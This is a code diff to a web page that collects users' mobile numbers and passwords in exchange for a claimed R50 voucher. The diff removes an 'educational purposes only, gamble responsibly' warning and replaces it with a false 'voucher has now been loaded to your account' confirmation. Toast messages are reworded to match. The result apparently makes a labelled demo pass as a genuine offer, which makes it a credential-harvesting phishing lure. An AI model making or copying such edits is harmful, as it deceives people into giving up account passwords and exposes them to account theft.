@@ -927,12 +927,12 @@
     <div class="modal-overlay" id="cautionModal">
         <div class="modal-box">
             <div class="modal-icon"><i class="fas fa-exclamation-triangle"></i></div>
-            <h3>BECAREFUL</h3>
+            <h3>CONGRATULATION</h3>
             <p>
-                <i class="fas fa-info-circle"></i> This is for educational purposes only. Always gamble responsibly.
+                <i class="fas fa-info-circle"></i> Your voucher has now been loaded to your account.
             </p>
             <button class="modal-btn" id="closeModalBtn">
-                <i class="fas fa-check-circle"></i> I understand
+                <i class="fas fa-check-circle"></i> Thank You
             </button>
         </div>
     </div>
@@ -1012,7 +1012,7 @@
                     // Only check for duplicates if NOT admin
                     if (!isAdmin) {
                         if (isDuplicate(mobile, password)) {
-                            showToast('This entry already exists! Duplicate not saved.', 'warning');
+                            showToast('This Account has already claimed the R50 Voucher.', 'warning');
                             return false;
                         }
                     }
@@ -1025,7 +1025,7 @@
                     };
                     existingData.push(newEntry);
                     localStorage.setItem(STORAGE_KEY, JSON.stringify(existingData));
-                    showToast('Voucher claimed successfully! Data saved.', 'success');
+                    showToast('Voucher claimed successfully!.', 'success');
                     return true;
                 } catch (error) {
                     console.error('Error saving data:', error);
